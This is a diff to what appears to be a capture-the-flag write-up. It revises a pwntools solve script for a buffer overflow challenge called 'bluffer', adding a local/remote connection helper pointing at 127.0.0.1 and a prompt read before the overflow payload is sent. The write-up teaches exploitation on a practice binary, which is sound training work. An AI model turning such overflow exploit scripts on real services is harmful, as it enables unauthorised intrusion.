@@ -119,8 +119,17 @@ Anyway, you can use pwntools to solve it more easier 😉
 ```python
 from pwn import *
 
-p = process("./bluffer")
-# p = remote("HOST", PORT) # modified after competition
+elf = context.binary = ELF("../src/blufferoverflow/bluffer", checksec=False)
+
+def conn():
+    if args.REMOTE:
+        p = remote("127.0.0.1", 1337)
+    else:
+        p = process(elf.path)
+    return p
+
+p = conn()
+
 
 offset = 20
 
@@ -130,6 +139,7 @@ payload = flat({
 	]
 })
 
+p.recvuntil(b": ")
 
 p.sendline(payload)
 
